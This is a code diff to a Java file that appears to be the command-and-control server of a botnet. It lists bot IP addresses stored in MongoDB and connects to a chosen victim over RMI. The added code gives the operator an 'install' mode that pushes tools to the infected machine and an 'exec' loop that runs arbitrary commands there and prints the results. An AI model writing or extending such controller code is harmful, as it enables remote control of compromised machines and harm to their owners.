@@ -6,7 +6,6 @@
 package server;
 
 import DBUtils.MongoConnect;
-import SServer_package.SServer;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
@@ -32,8 +31,8 @@ public class RMIServer {
     
     public static void main(String[] args) {
         try {
-            SServer sserver = new SServer(2345);
-            sserver.start();
+            TCPServer tcpServer = new TCPServer(2345);
+            tcpServer.start();
             System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
             MongoConnect client = new MongoConnect();
             client.Connect();
@@ -43,32 +42,42 @@ public class RMIServer {
                 for (int i = 0; i<list.size(); i++){
                     System.out.println((i+1) + ": " + list.get(i));
                 }
-                System.out.print("Select IP to controll: ");
+                System.out.print("Select IP to control: ");
                 Scanner scanner = new Scanner(System.in);
+                
                 Integer id = Integer.parseInt(scanner.nextLine());
                 String ip = list.get(id-1);
                 IBotnet botnet = (IBotnet) Naming.lookup("rmi:/" + ip + ":" + "1234" + "/BotnetRMI");
                 botnet.testing();
+                
+                System.out.println("Install app type: install");
+                System.out.println("Run command type: exec");
+                String install = scanner.nextLine();
+                
+                if(install.equals("install")){
+                    System.out.println(">Install app/tools, pls wait 5-10 minutes!");
+                    ArrayList<String> arrInstall = botnet.installApp();
+                    for(String i:arrInstall){
+                        System.out.println(i);
+                    }
+                    System.out.println("Completed");
+                }
+                else if(install.equals("exec")){
+                    while(true){
+                        String cmd = scanner.nextLine();
+                        if(!cmd.equals("exit")){
+                            ArrayList<String> arr = botnet.runCommand(cmd);
+                            for(String i:arr){
+                                System.out.println(i);
+                            }
+                        }
+                        else{
+                            break;
+                        }
+                    }
+                }
             }
             
-//            IBotnet botnet = (IBotnet) Naming.lookup("rmi://127.0.0.1:1234/BotnetRMI");
-            
-//            while(true){
-//                Scanner scanner= new Scanner(System.in);
-//                String cmd = scanner.nextLine();
-//                
-//                ArrayList<String> arr = botnet.runCommand(cmd);
-//                
-//                for(String i:arr){
-//                    System.out.println(i);
-//                }
-                
-//                System.out.println(botnet.runCommand(cmd));
-//                String s = null;
-//                while ((s = br.readLine()) != null) {
-//                    System.out.println(s);
-//                }
-//            }
         } catch (RemoteException ex) {
             Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
         } catch (NotBoundException ex) {
